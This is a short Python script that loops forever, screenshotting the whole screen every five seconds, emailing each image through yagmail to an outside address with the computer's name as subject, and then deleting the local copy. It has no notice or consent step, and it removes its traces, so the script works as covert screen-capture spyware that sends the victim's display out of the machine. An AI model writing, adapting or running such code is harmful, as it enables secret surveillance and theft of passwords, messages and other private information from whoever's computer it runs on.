from time import sleep
import pyautogui
import yagmail
import random
import os

ssTaken = 0

def send(file):
    receiver = "to@gmail.com"
    body = "Hello there from Yagmail"

    yag = yagmail.SMTP("from@gmail.com", "password")
    yag.send(
        to=receiver,
        subject=os.environ['COMPUTERNAME'],
        contents=body,
        attachments=file,
    )

while True:
    name = os.environ['COMPUTERNAME'] + ".png"
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save(name)
    send(name)
    os.remove(name)
    sleep(5)
